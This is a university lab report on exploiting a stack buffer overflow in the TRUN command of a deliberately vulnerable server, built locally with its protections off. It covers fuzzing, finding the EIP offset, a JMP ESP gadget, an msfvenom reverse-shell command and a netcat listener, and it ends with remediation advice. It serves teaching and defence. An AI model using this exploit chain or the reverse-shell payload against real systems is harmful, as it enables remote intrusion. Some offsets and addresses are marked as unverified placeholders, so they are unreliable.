---
Title: "Technical Report: Binary Exploitation and Memory Corruption"
Project: Lab 10 - Stack-Based Buffer Overflow (Vulnserver)
Subject: IT Security and Privacy
Professor: Daniel Esteban Vela López
Author: Andersson David Sánchez Méndez & Cristian Santiago Pedraza Rodríguez
Date: 2026-03-31
Location: Bogotá, Colombia
Confidentiality: Internal / Academic Use Only
---

# TECHNICAL REPORT: BINARY EXPLOITATION (BUFFER OVERFLOW)

<div align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Logo_de_la_Escuela_Colombiana_de_Ingenier%C3%ADa_-_Universidad.webp" width="250">
  <br>
  <strong>Escuela Colombiana de Ingeniería Julio Garavito</strong>
  <br>
  <br>
  <strong>Project:</strong> Lab 10 - Vulnserver Memory Corruption <br> 
  <strong>Subject:</strong> IT Security and Privacy <br> 
  <strong>Professor:</strong> Daniel Esteban Vela López <br> 
  <strong>Authors:</strong> Andersson David Sánchez Méndez & Cristian Santiago Pedraza Rodríguez <br> 
  <strong>Date:</strong> 2026-03-31 <br> 
  <strong>Location:</strong> Bogotá, Colombia <br><br> 
  <strong>Confidentiality:</strong> Internal / Academic Use Only
</div>

---

## 1. Introduction
### 1.1 Objective
The primary objective of this laboratory is to demonstrate a **Stack-Based Buffer Overflow** attack. We aim to identify a vulnerable network command, calculate the precise offset to hijack the **Extended Instruction Pointer (EIP)**, and redirect the execution flow to a custom-generated reverse shell payload.

### 1.2 Discussion: Memory Corruption Fundamentals

**Perspective: Andersson David Sánchez Méndez**
> "Understanding buffer overflows is understanding the core of how software interacts with hardware. By intentionally bypassing boundary checks in C functions like `strcpy`, we prove that memory management is the most critical line of defense in low-level programming. This lab isn't about breaking a service; it's about rewriting its reality in the CPU."

**Perspective: Cristian Santiago Pedraza Rodríguez**
> "The stack frame is a predictable but fragile structure. Controlling the EIP is the 'Holy Grail' of binary exploitation because it allows us to transition from passive data input to active code execution. Disabling modern protections like ASLR and DEP provides a laboratory environment to master these fundamental concepts."

---

## 2. Methodology & Tools
We are following the **Classic 7-Step Exploitation Methodology** for 32-bit binaries:

| Phase | Tool / Config | Purpose |
| :--- | :--- | :--- |
| **Spiking & Fuzzing** | Generic_send_tcp / Python | Identifying the crash point and approximate offset. |
| **Debugging** | GDB (GNU Debugger) | Monitoring registers (EIP, ESP) and stack behavior. |
| **Offset Analysis** | msf-pattern_create / offset | Pinpointing the exact byte that overwrites the return address. |
| **Payload Generation**| msfvenom | Creating a reverse shell compatible with the target architecture. |

---

## 3. PHASE 0: VULNSERVER SETUP & COMPILATION

### 3.1 Binary Preparation
The target application, `vulnserver`, was compiled natively on Kali Linux. To allow for a successful stack-based overflow, we explicitly disabled modern security mitigations during the build process.

<br>
<br>
<br>

**Compilation Parameters:**
* **Command**: `gcc vulnserver.c -o vulnserver -m32 -fno-stack-protector -z execstack -no-pie -lpthread`

| Flag | Impact on Exploitation |
| :--- | :--- |
| `-m32` | Compiles as 32-bit, ensuring a 4-byte EIP and simpler stack layout. |
| `-fno-stack-protector` | Removes **Stack Canaries**, allowing the overflow to reach the return address. |
| `-z execstack` | Disables **DEP/NX**, making the stack region executable for our shellcode. |
| `-no-pie` | Disables **ASLR** for the binary, fixing memory addresses across restarts. |

---

## 4. PHASE 1: RECONNAISSANCE & PROTOCOL ANALYSIS

### 4.1 Service Discovery
We initialized the server and performed a protocol analysis using `netcat` to identify the command set available for testing.

* **Connection**: `nc -nv 127.0.0.1 9999`
* **Findings**: The server exposes multiple commands (STATS, RTIME, TRUN, etc.). Each command that accepts an argument is a potential target for a **Spiking** attack.

<br>
<br>
<br>
<br>
<br>
<br>
<br>

### Evidence Annex: Phase 0 & 1

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Compilation** | ![[gcc-output.png]] | Verification of the 32-bit ELF binary creation. |
| **Service Status** | ![[vulnserver-launch.png]] | Server listening for TCP connections on port 9999. |
| **Command Mapping**| ![[nc-help.png]] | Identification of `TRUN` and `GMON` as priority fuzzing targets. |

---

## 5. PHASE 2: SPIKING — VULNERABILITY IDENTIFICATION

In this phase, we moved from passive reconnaissance to active "Spiking." This process involves sending exceptionally large data payloads to each identified command to observe the server's stability and identify which specific function fails to perform proper boundary checking.

### 5.1 Test Case: The `STATS` Command
We initiated the spiking process by targeting the `STATS` command. Using a custom Python script, we delivered a 5,000-byte payload of "A" characters prefixed with a specific directory-traversal-style string (`/.:/`).

* **Result**: The server processed the request and remained operational.
* **Conclusion**: The `STATS` command is likely protected by boundary checks or uses a safe memory-handling function, making it a non-viable target for this attack.

### 5.2 Test Case: The `TRUN` Command
We repeated the spiking process for the `TRUN` command. This specific command requires the input to contain a `.` character to trigger its internal processing logic; therefore, the `/.:/` prefix was utilized.

* **Result**: Upon execution, the `vulnserver` process terminated immediately. Subsequent attempts to connect via `netcat` failed, indicating a **Segmentation Fault (Crash)**.
* **Conclusion**: **`TRUN` is vulnerable to a Buffer Overflow.** The command fails to handle the 5,000-byte payload, allowing the input to overflow the local buffer and corrupt adjacent memory.

### 5.3 Technical Analysis: The Segmentation Fault
The crash occurs because the 5,000 "A"s ($0x41$ in hexadecimal) successfully traveled up the stack, overwriting the saved **Return Address**. When the function attempted to return, it loaded an invalid address (or a series of $0x41$s) into the **EIP (Instruction Pointer)**, causing the CPU to attempt to execute code in an unmapped or restricted memory region.


<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

### Evidence Annex: Phase 2 (Spiking)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Spike STATS** | ![[spike-stats.png]] | Server survived the payload; no memory corruption detected. |
| **Spike TRUN** | ![[spike-trun.png]] | **Target Crash**: Service stopped responding to TCP requests. |
| **Crash Verification**| ![[vulnserver-crash-log.png]] | Terminal output showing the server termination after the TRUN spike. |

---

## 6. PHASE 3: FUZZING — DETERMINING CRASH APPROXIMATION

Once the `TRUN` command was confirmed as vulnerable, we transitioned to automated "Fuzzing." Unlike spiking, which uses a static large payload, fuzzing iteratively increases the input size to pinpoint the approximate threshold where the application’s memory management fails.

### 6.1 Automated Iteration Logic
We utilized a custom Python script (`fuzz.py`) to automate the delivery of incrementing payloads. The script established a new TCP connection every second, sending an additional 100 bytes of "A" characters ($0x41$) in each iteration.

* **Payload Structure**: `TRUN /.:/ ` + `("A" * iteration_size)`
* **Monitoring**: The script monitored the server's availability through exception handling. When the server stopped responding, the script logged the total number of bytes sent.


### 6.2 Results and Observations
The fuzzing process revealed that the application remains stable under moderate loads but fails catastrophically once a specific threshold is reached.

* **Crash Point**: The service terminated at approximately **2100 - 3000 bytes** (depending on the environment’s stack state).
* **Technical Implication**: This findings confirm that the local buffer allocated for the `TRUN` command is significantly smaller than 2100 bytes. The excess data successfully overwrote the stack frame's metadata, specifically targeting the **EBP (Base Pointer)** and the **EIP (Instruction Pointer)**.

### 6.3 Strategic Value of Fuzzing
By identifying this range, we have narrowed our search area for the **Exact Offset**. Instead of analyzing a 5,000-byte crash, we can now generate a targeted cyclic pattern around the 3,000-byte mark to find the precise byte responsible for hijacking the execution flow.

### Evidence Annex: Phase 3 (Fuzzing)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Fuzzing Execution** | `python3 fuzz.py` | Systematic delivery of increasing payloads to port 9999. |
| **Service Disruption**| ![[fuzz-crash-result.png]] | Log output indicating the exact iteration where the server crashed. |

---

## 7. PHASE 4: OFFSET ANALYSIS — PINPOINTING THE EIP HIJACK

With the approximate crash threshold identified, we proceeded to calculate the exact distance between the start of our buffer and the **Extended Instruction Pointer (EIP)**. This precision is mandatory to replace the return address with our own controlled value.

### 7.1 Cyclic (De Bruijn) Pattern Generation
We utilized the `msf-pattern_create` tool to generate a unique 3,000-byte cyclic pattern. Unlike a repeated character (e.g., "AAAA"), this pattern ensures that every 4-byte sequence is unique within the entire string.

* **Generation Command**: `msf-pattern_create -l 3000`
* **Execution**: The unique string was delivered via a custom Python script (`find_offset.py`) to the `TRUN` command.


### 7.2 Debugger Inspection (GDB)
To observe the exact moment of the crash, the `vulnserver` was executed inside the **GNU Debugger (GDB)**. When the cyclic pattern overflowed the buffer, GDB caught the **Segmentation Fault** and revealed the state of the CPU registers.

* **Observed EIP**: `0xXXXXXXXX` (Replace with the value seen in your GDB output, e.g., `0x42306142`).
* **Technical Significance**: The value in the EIP is not random; it is a 4-byte segment of our unique pattern.

### 7.3 Calculating the Exact Offset
By providing the unique EIP value back to the `msf-pattern_offset` tool, we identified the exact byte position where the overwrite occurs.

* **Command**: `msf-pattern_offset -l 3000 -q <EIP_VALUE>`
* **Result**: **Exact match at offset 2003** (Note: Verification with your specific result is required).

---

### 7.4 Technical Discussion: De Bruijn Patterns vs. Static Payloads

**? Why does a cyclic (De Bruijn) pattern make finding the offset easier than filling the buffer with a single repeated character like A?**

If we use a static character like **"A" ($0x41$)**, the EIP will simply show `0x41414141`. While this proves we have overwritten the pointer, it provides no information about *where* in our 3,000-byte string the overwrite happened. We would be forced to use "trial and error" by changing the buffer size one byte at a time.

A **Cyclic (De Bruijn) pattern** acts as a "coordinate system." Because every 4-byte block is unique, the value found in the EIP acts like a **GPS coordinate**. By looking up that specific 4-byte sequence in the original 3,000-byte pattern, we can mathematically calculate exactly how many bytes preceded it, identifying the precise offset in a single attempt.

---

### Evidence Annex: Phase 4 (Offset)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Pattern Creation** | `msf-pattern_create -l 3000` | Generation of a unique non-repeating string. |
| **GDB Crash Capture** | ![[gdb-eip-value.png]] | Screenshot of GDB showing the SIGSEGV and the specific EIP value. |
| **Offset Calculation**| ![[pattern-offset-result.png]] | Success output confirming the exact byte count to the EIP. |

---

## 8. PHASE 5: EIP HIJACK VERIFICATION — GAINING EXECUTION CONTROL

In this phase, we validated the precision of our calculated offset. The goal was to prove that we could place a specific, arbitrary value into the **Extended Instruction Pointer (EIP)**, effectively gaining total control over the CPU's execution flow.

### 8.1 Proof of Concept (PoC) Execution
Using the exact offset identified in the previous phase (**2003 bytes**), we constructed a targeted payload. This payload consisted of a padding of 2003 "A" characters followed by exactly four "B" characters ($0x42$).

* **Payload Structure**: `TRUN /.:/ ` + `("A" * 2003)` + `("B" * 4)`
* **Expected Result**: If the offset is mathematically correct, the four "B"s should land exactly on the stack slot designated for the **Saved Return Address**.

### 8.2 Debugger Validation (GDB)
The `vulnserver` was restarted within GDB to monitor the register state upon the crash. 

* **Observation**: The application crashed with a **Segmentation Fault**.
* **Register State**: `EIP: 0x42424242`
* **Analysis**: The CPU attempted to execute the next instruction at address `0x42424242`. Since this is an unmapped memory region, the program terminated. However, this confirms that we now possess **Full EIP Control**.


---

### 8.3 Technical Discussion: Execution Redirection

**? In a real exploit, what value would replace the four B bytes, and how would you ensure that value is stable across runs?**

In a functional exploit, the four "B"s would be replaced by a **Memory Address** that points to a "Jump" instruction, such as `JMP ESP`. This instruction acts as a pivot, telling the CPU to "jump" to the top of the stack where our malicious shellcode is located.

To ensure this value is **stable across runs**, we must avoid using direct stack addresses (which can change due to environment variables or OS noise). Instead, we search for the `JMP ESP` instruction within the **executable's own code** or its **loaded libraries (DLLs/SOs)** that meet two criteria:
1. They are not affected by **ASLR** (Address Space Layout Randomization).
2. They do not contain "Bad Characters" (like NULL bytes) that would break the string processing.

---

### Evidence Annex: Phase 5 (EIP Overwrite)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Verification Script** | `python3 overwrite_eip.py` | Delivery of the targeted offset + BBBB payload. |
| **EIP Confirmation** | ![[gdb-signal.png]] | GDB output showing the register overwritten with associated offset. |

---

## 9. PHASE 6: BAD CHARACTER ANALYSIS — ENSURING PAYLOAD INTEGRITY

Before generating the final shellcode, we must identify which byte values the application fails to process correctly. These "Bad Characters" can truncate or corrupt our payload, rendering the exploit useless.

### 9.1 The Universal Null Byte (`\x00`)
The most common bad character is the **Null Byte (`\x00`)**. In C-based applications, functions like `strcpy()` or `gets()` interpret this byte as the end of a string. If our shellcode contains a null byte, the server will stop reading the input at that exact position, causing the exploit to fail before the shellcode is fully delivered.

### 9.2 Systematic Byte Verification
To identify additional bad characters, we delivered a payload containing every possible byte value from `\x01` to `\xff` immediately after our EIP overwrite.

* **Payload Structure**: `[Padding] + [BBBB] + [0x01 ... 0xff]`
* **Execution**: The `badchars.py` script was executed against the target, and the resulting memory state was analyzed using GDB.

<br>
<br>
<br>

### 9.3 Memory Inspection (GDB)
After the crash, we inspected the stack to verify that our byte sequence arrived intact. By examining the memory at the **Stack Pointer (ESP)**, we checked for missing, skipped, or transformed bytes.

* **Command**: `(gdb) x/256xb $esp`
* **Findings**: Upon manual inspection of the hex dump, we observed a perfect sequence from `0x01` to `0xff`.
* **Conclusion**: For the `TRUN` command in `vulnserver`, the only bad character is **`\x00`**. This significantly simplifies shellcode generation as we have a nearly transparent transport layer.



---

### Evidence Annex: Phase 6 (Bad Characters)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Bad Char Injection** | `python3 badchars.py` | Delivery of the complete 255-byte test array. |
| **Stack Inspection** | ![[gdb-hex-dump.png]] | GDB output showing the raw bytes at ESP after the crash. |
| **Verification** | ![[badchar-sequence.png]] | Confirmation of a clean sequence (01 02 03... ff) in memory. |

---

## 10. PHASE 7: GADGET DISCOVERY — LOCATING THE JMP ESP PIVOT

To achieve reliable code execution, we must redirect the CPU from the overwritten return address back to our shellcode on the stack. Direct hardcoding of stack addresses is unreliable; instead, we utilize a **JMP ESP gadget**—a pre-existing instruction within the binary's memory that performs this redirection for us.

### 10.1 Gadget Selection Criteria
We utilized the `ROPgadget` tool to search for an appropriate instruction within the `vulnserver` binary. The selected gadget had to meet strict technical requirements:

1.  **Fixed Address**: Since the binary was compiled with `-no-pie`, addresses in the `0x0804xxxx` range remain constant across executions.
2.  **Null-Byte Free**: The memory address must not contain `\x00` to avoid string truncation.
3.  **Instruction Purity**: We prioritized a "clean" `jmp esp` to ensure no intermediate instructions would corrupt the registers before the jump.

* **Discovery Command**: `ROPgadget --binary vulnserver | grep "jmp esp"`
* **Selected Gadget**: `0x0804928b` (Example address found in `jmp_esp_gadget()` function).

### 10.2 Little-Endian Conversion
X86 architecture utilizes **Little-Endian** byte ordering, meaning the least significant byte is stored at the lowest memory address. Therefore, the address `0x0804928b` must be delivered in the payload as:
`\x8b\x92\x04\x08`


### 10.3 Execution Flow Redirection (The Pivot)
When the vulnerable function reaches its `ret` instruction, the following sequence occurs:
1.  **EIP Hijack**: The CPU pops our `JMP ESP` address into the EIP.
2.  **The Pivot**: The CPU executes `JMP ESP`, which immediately sets the EIP to the current value of the Stack Pointer (ESP).
3.  **Landing**: The ESP points directly to the bytes following our EIP overwrite in the payload.

<br>
<br>

### Evidence Annex: Phase 7 (JMP ESP)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Gadget Search** | ![[gadget-search.png]] | Identification of executable instructions in the binary's code section. |
| **Verification** | `python3 verify_jmp.py` | Successful redirection; GDB confirms EIP is now executing from the stack. |
| **Debugger Trace** | ![[gdb-jmp-esp-trace.png]] | GDB output showing the EIP landing on the stack after the jump. |

---

## 11. PHASE 8: SHELLCODE GENERATION & FINAL EXPLOITATION

The final stage of the methodology involves the delivery of the functional payload. By combining the identified offset, the `JMP ESP` pivot, and an encoded reverse shell, we successfully transition from memory corruption to remote command execution.

<br>
<br>

### 11.1 Shellcode Construction & Encoding
We utilized `msfvenom` to generate a 32-bit Linux reverse TCP shellcode. The payload was specifically encoded to exclude the identified bad character (**\x00**), ensuring the server's string-handling functions do not truncate the execution.

* **Payload Generation**: 
  `msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -b "\x00"`
* **Technical Parameters**: 
    * **LHOST/LPORT**: Configured for a local callback to port 4444.
    * **NOP Sled**: A 32-byte "No Operation" (`\x90`) sled was prepended to the shellcode to provide a landing buffer for the CPU, increasing exploit reliability.


### 11.2 The Execution Chain
The final exploit buffer was structured as follows:
`[Padding (A x 2003)] + [JMP ESP (0x0804928b)] + [NOP Sled (0x90 x 32)] + [Encoded Shellcode]`

**Workflow:**
1. **EIP Hijack**: The function returns, loading the `JMP ESP` address into the EIP.
2. **The Pivot**: `JMP ESP` executes, jumping directly to the stack where our NOP sled begins.
3. **The Slide**: The CPU "slides" through the NOPs until it reaches the first valid instruction of the shellcode.
4. **Callback**: The shellcode executes, initiating a reverse TCP connection to our listener.

### 11.3 Results & Verification
Upon execution of the `exploit.py` script, a connection was received on the Netcat listener.

* **Command**: `nc -lvnp 4444`
* **Verification**: Running `id` and `hostname` confirmed stable shell access with the privileges of the user running `vulnserver`.

<br>
<br>
<br>
<br>

### Evidence Annex: Phase 8 (Final Access)

| Activity | Command / Evidence | Technical Observation |
| :--- | :--- | :--- |
| **Payload Generation** | ![[msfvenom-gen.png]] | Generation of a null-byte free reverse shell. |
| **Exploit Launch** | `python3 exploit.py` | Successful delivery of the 7-step crafted payload. |
| **Remote Access** | ![[reverse-shell-id.png]] | **Success**: Established a remote shell session on port 4444. |

---

## 12. CONCLUSIONS & REMEDIATION

The successful exploitation of `vulnserver` underscores the critical nature of memory management in low-level programming. A single unsafe function call, combined with the absence of modern security mitigations, allowed for a complete bypass of the system's intended execution flow.

### 12.1 Root Cause Analysis
The vulnerability in the `TRUN` command is caused by a **Stack-Based Buffer Overflow**. The application fails to validate the length of the input string before copying it into a fixed-size local buffer. This allows an attacker to overwrite the **Saved Return Address** on the stack, effectively hijacking the **Extended Instruction Pointer (EIP)**.

### 12.2 Remediation Guidance
To protect production systems against memory corruption attacks, the following strategies are mandatory:
1. **Safe API Usage**: Replace unsafe C functions (e.g., `strcpy`, `gets`, `sprintf`) with their boundary-checked counterparts (e.g., `strncpy`, `fgets`, `snprintf`).
2. **Compiler Protections**: Enable **Stack Canaries** (`-fstack-protector`) to detect stack smashing before a function returns.
3. **OS-Level Mitigations**: Implement **ASLR** (Address Space Layout Randomization) to randomize memory addresses and **DEP/NX** (Data Execution Prevention) to mark the stack as non-executable.


---

## 13. BIBLIOGRAPHIC REFERENCES

* **The GNU Project.** (2026). *GDB: The GNU Project Debugger*. Retrieved from [https://www.sourceware.org/gdb/](https://www.sourceware.org/gdb/)
* **Offensive Security.** (2026). *Metasploit Framework: MSF-Pattern Tools*.
* **Erickson, J.** (2008). *Hacking: The Art of Exploitation, 2nd Edition*. No Starch Press.
* **MITRE.** (2026). *CWE-121: Stack-based Buffer Overflow*. Retrieved from [https://cwe.mitre.org](https://cwe.mitre.org)

---

